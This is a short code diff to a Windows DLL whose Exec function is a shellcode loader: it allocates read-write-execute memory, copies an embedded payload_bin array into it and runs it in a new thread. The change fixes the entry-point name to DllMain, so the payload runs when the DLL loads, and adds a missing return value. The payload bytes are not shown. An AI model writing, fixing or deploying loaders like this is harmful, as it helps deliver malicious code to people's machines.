@@ -54,10 +54,11 @@ BOOL Exec() {
 	LPVOID pAddr = VirtualAlloc(NULL, sizeof(payload_bin), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(pAddr, payload_bin, sizeof(payload_bin));
 	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pAddr, 0, 0, 0);
+	return TRUE;
 }
 
 
-BOOL APIENTRY DLLMain(HMODULE hModule,
+BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD nReason, LPVOID lpReservered) {
 	switch (nReason) {
 
